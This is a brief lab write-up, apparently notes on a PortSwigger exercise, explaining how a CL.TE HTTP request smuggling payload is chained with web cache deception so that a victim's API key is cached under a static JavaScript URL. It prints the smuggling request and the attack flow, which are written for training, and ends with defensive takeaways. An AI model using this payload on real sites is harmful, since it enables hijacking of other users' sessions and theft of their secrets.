# HTTP Request Smuggling → Web Cache Deception



## Overview



This lab combines **HTTP Request Smuggling** with **Web Cache Deception**.



The goal is to make the victim's request cause their **API key** to be stored in the cache, then retrieve it from a 
cached static resource.



## Key Conditions



* Front-end does **not support chunked encoding**.

* Back-end **supports chunked encoding**.

* The front-end caches **static resources**.

* The intended solution requires **HTTP/1.1**.

* The victim periodically sends requests after several attacker POST requests.

* Wait **30 seconds** before attempting to trigger the victim.



## Attack Idea



Exploit a **CL.TE desynchronization**:



```http

POST / HTTP/1.1

Content-Length: 42

Transfer-Encoding: chunked




0



GET /my-account HTTP/1.1

X-Ignore: X


```



The front-end uses `Content-Length`, while the back-end processes `Transfer-Encoding: chunked`.



The smuggled request:




```http


GET /my-account HTTP/1.1

X-Ignore: X

```



gets processed together with the victim's request.



## Attack Flow



```text

Attacker POST

      ↓

CL.TE desynchronization

      ↓

Smuggled GET /my-account

      ↓

Victim's session

      ↓

Victim's API key

      ↓

Response cached under a static resource

      ↓


Attacker requests the static resource

      ↓

Victim's API key is retrieved

```



## Web Cache Deception


The cache expects something like:



```text

/resources/js/tracking.js

        ↓

JavaScript
```



But because of the smuggling attack, it stores:



```text
/resources/js/tracking.js

        ↓


/my-account response

        ↓

Victim's API key

```



So requesting the static resource reveals the victim's sensitive response.



## Important Difference



**Cache Poisoning:**



```text


Attacker-controlled response → Cache → Victim

```



**Web Cache Deception:**



```text

Victim's sensitive response → Cache → Attacker

```


## Takeaways



* **CL.TE** = front-end uses `Content-Length`, back-end uses `Transfer-Encoding`.

* Request smuggling can be chained with other vulnerabilities.

* A cache can accidentally store sensitive dynamic content under a static URL.

* Static-looking URLs are not automatically safe to cache.

* Always investigate caching behavior when dynamic responses lack proper cache-control protections.



**Source:** [PortSwigger — Exploiting HTTP request smuggling to perform web cache deception](https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-deception?utm_source=chatgpt.com)
